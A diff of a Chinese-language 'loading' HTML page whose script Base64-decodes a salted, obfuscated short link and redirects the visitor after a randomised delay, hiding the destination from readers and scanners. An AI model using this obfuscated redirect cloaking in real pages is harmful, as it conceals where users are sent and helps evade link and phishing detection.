@@ -2,7 +2,7 @@
 <html lang="zh">
 <head>
   <meta charset="UTF-8">
-  <title>页面加载中...</title>
+  <title>正在加载中...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     html, body {
@@ -20,20 +20,26 @@
   </style>
 </head>
 <body>
-  <div>页面加载中，请稍候…</div>
+  <div>正在加载中，请稍等…</div>
 
   <script>
-    // 加盐编码（前缀+Base64链接+后缀）
-    const wrapper = "keuiaHR0cHM6Ly92bGluay5jYy94eHh2dnY=kzew";
+    // 混淆链接（前缀 + b64 + 后缀）
+    const token = "keuiaHR0cHM6Ly92bGluay5jYy94eHh2dnY=kzew";  // 替换为你的加密链接
+    const start = 4, end = 4;
 
-    // 解码逻辑（去除前后缀再 Base64 解码）
-    const clean = wrapper.slice(4, -4); // 移除前4位和后4位
-    const link = atob(clean);
+    // 解码函数
+    function go() {
+      try {
+        const base64 = token.slice(start, -end);
+        const target = atob(base64);
+        window.location.href = target;
+      } catch (e) {
+        console.log("异常终止：地址无效");
+      }
+    }
 
-    // 延迟跳转
-    setTimeout(() => {
-      location.href = link;
-    }, 1000);
+    // 随机延迟 800-1000 毫秒后跳转
+    setTimeout(go, 800 + Math.random() * 800);
   </script>
 </body>
 </html>
